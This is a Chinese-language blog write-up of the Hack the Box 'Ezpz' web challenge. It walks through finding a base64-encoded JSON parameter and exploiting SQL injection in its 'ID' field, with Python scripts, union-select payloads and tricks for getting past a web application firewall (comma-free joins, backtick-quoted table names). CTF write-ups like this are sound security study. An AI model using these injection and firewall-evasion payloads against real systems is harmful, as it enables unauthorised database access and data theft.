---
title: "Hack the Box——Ezpz"
date: 2019-12-30T12:26:33+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## ezpz

访问HTB给的地址，进来就看想两个类似报错的东西。

![1](1.png)


### 尝试

这报错一看应该是少传了什么参数吧。试试加上个get参数

`?obj=1`

第一行报错没了，剩下第二行

![2](2.png)

试试再加一个参数

`?obj=1&ID=1`

错误并没有消失。因为第一个报错和第二个报错的内容不是很一样，我猜ID这个参数会不会是从POST传过去的。

![3](3.png)

报错以然存在，看来思路错了。

仔细读一下第二行报错`尝试从一个空对象获取ID属性`，是不是ID是附加在obj参数里的呢。

又尝试了几种payload

```

?obj=ID%3d1
?obj={"ID":"1"}
?obj=<ID>1</ID>
```

依然无效。

### 转机

因为对于burp的repeater不是很有把握，我决定用python写脚本再试试。

我发现打印的response.text里的最后一行居然有个hint的注释

![4](4.png)

出题人用了好多空行把它藏在了最后导致burp一眼看到。

![5](5.png)

既然他给了hint，那就试试吧。

把上面几个payload分别用base64编码。最后`?obj={"ID":"1"}`编码后得到payload为

`?obj=eyJJRCI6IjEifQ==`

这个参数请求后两个错误都消失了

### 真正的挑战

虽然错误没了，但是并没有出现flag，那说明关卡还要继续。因为每次都要base64编码一下参数用burp有点麻烦。顺手写了个脚本

```python   

def injection(payload):
    params = {
        "obj": base64.b64encode(payload.encode())
    }
    url = "http://docker.hackthebox.eu:30548/index.php"
    r = requests.get(url, params=params)
    soup = BeautifulSoup(r.text, 'html.parser')
    print(soup.body.text.strip())

if __name__ == '__main__':
    payload1 = '{"ID": "1"}'
    injection(payload1)
```

先试试sql注入`payload1 = '{"ID": "1\'"}'`，返回了新的错误信息，但是好像没太多有用的。

![6](6.png)

不过也说明了他这里是存在注入的吧。

### 开始测注入

#### 整型还是字符串型？

尝试`payload1 = '{"ID": "1 and 1=2 #"}'`返回正常结果

再尝试`payload = '{"ID": "1\' or 1=2 #"}'`,返回空。

这么看起来应该是第二个的and有效果，至于第一个为什么能返回正常结果我也不太清楚，下次用php试试。

这里应该就能猜出他这个`ID`是字符型。

#### 继续猜信息

尝试`payload1 = '{"ID": "-1\' union select 1, 2"}'`

返回的结果是`This request has been blocked by the server's application firewall`

看起来还有一层防火墙

稍微尝试了一下，有一些关键字和符号被过滤了，比如`where`, `limit`, `,`, `.`

因为没有逗号，所以改成用join来union

`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select 2 )B );#"}'`

我想用user()和databse()函数来直接回显信息，不知道为什么报错了。

`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select user() )B );#"}'`

加上length()函数有莫名其妙可以了。

`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select length(user()) )B );#"}'`

user()函数返回长度14，盲猜是root@localhost，爆出来应该也没什么意义

然后随手猜了下database(), length = 4，数据库名为ezpz

#### 换方向

flag应该是藏在数据库的某个地方，先查查表名

`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select table_name from information_schema.tables )B );#"}'`

但是这个也被拦截了，那么究竟拦截的是哪个字符串呢，写个函数判断一下

```python
def get_blocked_word(s):
    words = s.split(" ")
    for word in words:
        payload = '{{"ID": "-1\' union select * from ((select 1)A join (select \'{}\')B);#"}}'.format(word)
        print(word, injection(payload))

s = "select table_name from information_schema.columns"
get_blocked_word(s)
```

输出结果

```
select select
table_name table_name
from from
information_schema.tables This request has been blocked by the server's application firewall
```

再改改参数测一下，.asdtables并不会被拦截，那应该是.tables被拦截了

我记得mysql是可以给表名和数据库加上反引号"`"的，试了一下，成功的爆出了表名

![8](./8.png)

随手搜索一下`flag`，发现有张表叫`FlagTableUnguessableEzPZ`，那flag肯定在这张表里了。

`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select * from FlagTableUnguessableEzPZ )B );#"}'`

跑了一下，flag果然在这

![9](./9.png)

2020/2/17

寒假之前没做完的题，现在想起来才给它做了~




